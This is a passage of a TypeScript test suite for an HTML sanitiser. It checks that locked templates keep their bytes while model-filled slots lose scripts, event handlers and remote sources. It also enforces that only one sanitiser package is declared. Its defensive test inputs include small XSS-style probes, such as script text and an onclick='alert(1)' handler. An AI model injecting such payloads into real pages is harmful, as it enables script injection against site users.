  `<div data-wolf-fallback>the chart never rendered</div>` +
  SCRIPT_TEXT +
  `</section>`;

describe("the asymmetry: a template keeps its script, a slot does not", () => {
  it("passes the same script text through validateTemplate and strips it in sanitiseSlot", () => {
    // One test, both calls, on the SAME bytes. If these two ever agree, the
    // locking design is pointless: a template is reviewed by a human and
    // frozen by structureHash; a slot is filled daily by a model and never
    // reviewed by anyone.
    const validated = validateTemplate(TEMPLATE, MAX_BYTES);
    expect(validated.html).toContain(SCRIPT_TEXT);

    const sanitised = sanitiseSlot(SCRIPT_TEXT);
    expectAbsent(sanitised.html, ["<script", "alert(1)", "document.title"]);
  });

  it("keeps a template's remote script URL, and strips the same URL from a slot", () => {
    const withRemote =
      `<div data-wolf-fallback>no chart</div><script src="https://cdn.example/chart.js"></script>`;
    expect(validateTemplate(withRemote, MAX_BYTES).html).toContain("https://cdn.example/chart.js");
    expectAbsent(sanitiseSlot(withRemote).html, ["cdn.example", "script", "src"]);
  });
});

/* ================================================================== */
/* 8. validateTemplate never mutates and never returns HTML            */
/* ================================================================== */

describe("validateTemplate", () => {
  it("returns W16's ParsedTemplate — never HTML", () => {
    const result: unknown = validateTemplate(TEMPLATE, MAX_BYTES);
    // "never returns HTML" is a shape claim as much as a mutation claim: a
    // caller must not be able to mistake the return value for something it
    // may insert into a page.
    expect(typeof result).toBe("object");
    expect(typeof result).not.toBe("string");

    const parsed = parseTemplate(TEMPLATE, MAX_BYTES);
    expect(parsed.valid).toBe(true);
    if (!parsed.valid) return;
    expect(result).toEqual(parsed.template);
    expect(parsed.template.slotIds).toEqual(["headline"]);
  });

  it("returns the bytes it was handed, verbatim", () => {
    const result = validateTemplate(TEMPLATE, MAX_BYTES);
    expect(result.html).toBe(TEMPLATE);
    expect(result.byteLength).toBe(Buffer.byteLength(TEMPLATE, "utf8"));
    // The lock is sha256 of the STORED bytes with no normalisation, so a
    // mutating validator would silently forge it.
    expect(result.structureHash).toBe(structureHash(TEMPLATE));
  });

  it("does not strip anything the sanitiser would strip", () => {
    const hostile =
      `<div data-wolf-fallback>no chart</div>` +
      `<p onclick="alert(1)" id="chart" style="color:red">t</p>` +
      `<img src="https://cdn.example/logo.png">`;
    const result = validateTemplate(hostile, MAX_BYTES);
    expect(result.html).toBe(hostile);
    for (const token of ["onclick", "id=", "style=", "<img", "src="]) {
      expect(result.html).toContain(token);
    }
  });

  it("throws the shared taxonomy's `invalid` kind, carrying every error at once", () => {
    // Two mistakes, one throw: no fallback element, and a doctype.
    let thrown: unknown;
    try {
      validateTemplate(`<!doctype html><p data-wolf-slot="a">x</p>`, MAX_BYTES);
    } catch (error) {
      thrown = error;
    }
    expect(thrown).toBeInstanceOf(WolfError);
    const wolf = thrown as WolfError;
    expect(wolf.kind).toBe("invalid");
    const details = wolf.details as { errors: Array<{ path: string }> };
    expect(details.errors.length).toBeGreaterThanOrEqual(2);
    expect(details.errors.map((entry) => entry.path)).toContain("doctype");
  });

  it("throws rather than truncating an oversized template", () => {
    const big = `<div data-wolf-fallback>x</div>` + "y".repeat(1000);
    expect(() => validateTemplate(big, 100)).toThrow(WolfError);
  });

  it("exports no `sanitiseTemplate` — the name alone would invite mutating a locked template", () => {
    expect("sanitiseTemplate" in sanitiseModule).toBe(false);
    expect(Object.keys(sanitiseModule)).not.toContain("sanitiseTemplate");
    // The whole runtime surface, pinned: a second entry point added later is
    // a visible diff here.
    expect(Object.keys(sanitiseModule).sort()).toEqual([
      "SLOT_PROFILE",
      "sanitiseSlot",
      "validateTemplate",
    ]);
  });
});

/* ================================================================== */
/* 9. one sanitiser in the tree                                        */
/* ================================================================== */

/**
 * Reads every `package.json` in the repo — MANIFESTS, not source — and fails
 * if a second sanitiser is declared anywhere. It deliberately does not grep
 * source text: R145 records two guards in this repo that match raw source
 * and misfire on prose, which taught authors to obfuscate their own
 * comments. A manifest check cannot fail on its own text, so this file is
 * free to name `sanitize-html` and `xss` in full.
 */
const FORBIDDEN_SANITISERS = ["sanitize-html", "xss", "dompurify", "sanitize-html-react"];
const DEPENDENCY_BLOCKS = [
  "dependencies",
  "devDependencies",
  "peerDependencies",
  "optionalDependencies",
] as const;
const SKIP_DIRS = new Set(["node_modules", ".git", "dist", "build", "coverage", ".yarn"]);

function findManifests(dir: string, found: string[] = []): string[] {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    if (entry.isDirectory()) {
      if (SKIP_DIRS.has(entry.name)) continue;
      findManifests(join(dir, entry.name), found);
    } else if (entry.name === "package.json") {
      found.push(join(dir, entry.name));
    }
  }
  return found;
}

function readManifest(path: string): Record<string, unknown> {
  // NodeNext would want an import attribute for a JSON import, and the set
  // of manifests is discovered at runtime anyway.
  return JSON.parse(readFileSync(path, "utf8")) as Record<string, unknown>;
}

function declaredDependencies(manifest: Record<string, unknown>): Record<string, string> {
  const all: Record<string, string> = {};
  for (const block of DEPENDENCY_BLOCKS) {
    const entries = manifest[block];
    if (entries && typeof entries === "object") {
      Object.assign(all, entries as Record<string, string>);
    }
  }
  return all;
}

describe("exactly one sanitiser is in the tree", () => {
  const manifests = findManifests(repoRoot);

  // Non-vacuity: a scan that found nothing would pass every check below.
  it("finds every workspace manifest", () => {
    expect(manifests.length).toBeGreaterThanOrEqual(4);
    for (const expected of [
      join(repoRoot, "package.json"),
      join(apiRoot, "package.json"),
      join(repoRoot, "web", "package.json"),
    ]) {
      expect(manifests).toContain(expected);
    }
  });

  it.each(FORBIDDEN_SANITISERS)("declares `%s` in no manifest in the repo", (name) => {
    const offenders = manifests.filter((path) => name in declaredDependencies(readManifest(path)));
    expect(offenders).toEqual([]);
  });

  // ...and the scan really does read dependency blocks, so the check above
  // cannot be green because `declaredDependencies` returns nothing.
  it("reads dependency blocks (proved by finding the one sanitiser that IS declared)", () => {
    const declaring = manifests.filter(
      (path) => "isomorphic-dompurify" in declaredDependencies(readManifest(path)),
    );
    expect(declaring).toEqual([join(apiRoot, "package.json")]);
  });

  it("pins isomorphic-dompurify at ^2 in api/package.json", () => {
    const manifest = readManifest(join(apiRoot, "package.json"));
    const dependencies = manifest["dependencies"] as Record<string, string>;
    expect(dependencies["isomorphic-dompurify"]).toBe("^2");
  });
});


